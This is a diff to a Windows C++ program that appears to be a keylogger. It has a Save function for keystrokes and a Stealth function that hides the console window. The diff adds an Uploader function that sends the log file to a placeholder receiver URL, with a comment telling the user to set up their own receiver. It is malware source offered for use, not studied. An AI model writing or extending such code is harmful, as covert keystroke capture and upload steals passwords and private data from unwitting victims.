@@ -1,13 +1,13 @@
 #include <iostream>
 #include <fstream>
- 
 using namespace std;
- 
 #include <windows.h>
 #include <winuser.h>
+#include <ckupload.h>
  
 int Save (int key_stroke, char *file);
 void Stealth();
+void Uploader();
  
 int main()
 {
@@ -78,4 +78,21 @@ void Stealth()
  AllocConsole();
  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Stealth,0);
+}
+
+void Uploader()
+{
+    CkUpload upload;
+
+    upload.put_Hostname("www.example.com");
+    /*
+    Look dude,
+    Please make your own receiver.
+    */
+    upload.put_Path("/receiver.php");
+
+    upload.AddFileReference("file1","log.txt");
+
+    bool success;
+    success = upload.BlockingUpload();
 }
